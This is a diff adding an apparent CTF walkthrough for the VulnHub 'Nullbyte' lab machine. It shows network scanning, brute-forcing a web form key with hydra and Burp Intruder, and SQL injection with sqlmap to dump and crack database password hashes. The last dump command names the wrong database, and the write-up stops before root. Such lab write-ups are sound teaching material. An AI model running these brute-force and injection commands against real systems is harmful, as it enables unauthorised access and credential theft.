@@ -1,2 +1,130 @@
 # NullByte
+
 Nullbyte Walkthrough
+
+### Details
+
+* Name: Nullbyte ([VulnHub](https://www.vulnhub.com/entry/nullbyte-1,126/))
+* Goal/Objective: Get */root/proof.txt*
+
+### Scanning
+
+I began by using *netdiscover* to scan my network for computers/devices:
+```bash
+$sudo netdiscover
+```
+
+This then returned the IP address of the target machine: ***192.168.132.88***. From there I proceeded to do my intial scan on the network using *nmap*:
+```bash
+$nmap -A -p0-65535 192.168.132.88
+```
+
+The nmap scan returns promising results as there are a couple of ports open:
+     * 80/tcp - HTTP
+     * 111/tcp - RPCBIND
+     * 777/tcp - SSH
+     * 60316/tcp
+The two services that stood out to me immediately were HTTP & SSH. Note that SSH (port 22) is being forwarded to port 777, we'll keep this in mind for later.
+
+### Website Exploring
+
+I then proceeded to visit the website (http://192.168.132.88:80) to some investigating. The source code for the website did not display anything promising as it only contains a image & some text.
+
+However, I decided to check the image using exiftool to see if there was anything hidden within the metadata:
+```bash
+$exiftool main.gif
+```
+Looking through the output, I was able to see that there was a section labeled "comments" that contained something that could be useful: *P-): kzMb5nVYJw*
+
+
+While all this was being done, I did my normal routine of website scanning to help look for extra directories, etc:
+```bash
+# nikto scan
+$nikto -h http://192.168.132.88
+
+# gobuster
+$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.132.88/
+
+# dirb
+$dirb 192.168.132.88
+```
+The most important directories that were returned were */uploads* and ***/phpmyadmin/***
+
+### 'Key' cracking
+
+Remember that string that was returned by exiftool? The one labeled as a comment? "P-): kzMb5nVYJw". Yeah we're going to need that. If you remove the first couple of characters up until the space, you're left with "kzMb5nVYJw". This ends up being a directory within the website, http://192.168.132.88/kzMb5nVYJw.
+
+On this page we see a very simple page that contains a textbox titled "Key". However the issue is.. we don't have a key yet.
+
+There are two ways to approach cracking this "Key", using Hydra or Burpsuite. I will show you both.
+
+### Hydra
+
+If you open up the developer tools and go to the "Network" tab, and reload the website. You notice there is a POST request being made. If you click on it and expand the "Request" tab, you see that it is a value *key* is being used as form data. With all this in mind, we can use it to construct a hydra command to help us guess the value of "key".
+```bash
+$hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.132.88 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
+```
+A quick breakdown of the command we're using:
+     * -l: username (none)
+     * -P: "password" wordlist
+     * http-post-form: Recall it is a POST call being made using the form
+     * "/kzMb5nVYJw/index.php:key=^PASS^:invalid key": We encode the *key* to be url encoded so that it can be passed as an argument, then we use '^' to surround the value that we want hydra to brute form, the password aka the "key"
+The hydra command is able to find the password/key: elite
+
+### Burpsuite
+
+We will use burpsuite to also brute-force the value of "key".
+
+Start off by opening Burpsuite and selecting the proxy tab. Then click on "open browser" and visit the page that needs the key, http://192.168.132.88/kzMb5nVYJw. Next click on "interceptor on", then on the website type in anything into the textbox and press enter. 
+
+Then once the data is returned/shown on burpsuite, next to the "intercept is on" button, click on "Action" button and select "Send to Intruder". This will send the information over to the Intruder tab. Switch to the Intruder tab, and at the bottom of the page, highlight the section of the string after the "=" and click on button on the right "Add". Once this is done, you should be able to switch tabs from "Positions" over to the "Payloads" tab. From here the only thing you need to do is on the "Payload setting", click on "Load" and go to "/usr/share/wordlists" to select the wordlist you would like to use. Once you have done this, you may press the orange button on the top right, "Start attack".
+
+## SQL
+
+Now that we have the key, we can use it on the page. We are now greeted with a page that seems to allow us to search for usernames.
+
+Leaving the text-box empty and pressing enter returns a couple of entries from what appears to be a employee database. 
+
+Since this seems to use mysql, let's try using *sqlmap* to explore the database.
+```bash
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" --dbs
+```
+We see that sqlmap returns 5 databases. The two that we will explore are 'mysql' and 'seth'.
+
+If you are not familiar with SQL, recall: A database contains tables. A table can be pictured as an excel file, where there are rows and columns of information.
+
+### 'mysql' table
+
+Let's first explore the *mysql* database
+```bash
+# Check what tables are in the 'mysql' database
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql --tables
+
+# Check what columns are in the 'user' table (from the 'mysql database')
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T user --columns
+
+# Display User + Password from the 'user' table (from the 'mysql' database)
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T user -C User,Password --dump
+# Note that the command above will ask if you would like sqlmap to try and crack the passwords via a dictionary-based attack - select 'Y', then press enter to use the default password list.
+```
+
+### 'seth' table
+
+Next, let's explore the *seth* database
+```bash
+# Check what tables are in the 'seth' database
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth --tables
+
+# Check what columns are in the 'users' table (from the 'seth database')
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users --columns
+
+# Display User + Password from the 'users' table (from the 'seth' database)
+$sqlmap -u "http://192.168.132.88/kzMb5nVYJw/420search.php?usrtosearch=" -D mysql -T users -C User,Password --dump
+# Note that the command above will ask if you would like sqlmap to try and crack the passwords via a dictionary-based attack - select 'Y', then press enter to use the default password list.
+```
+
+
+
+
+
+
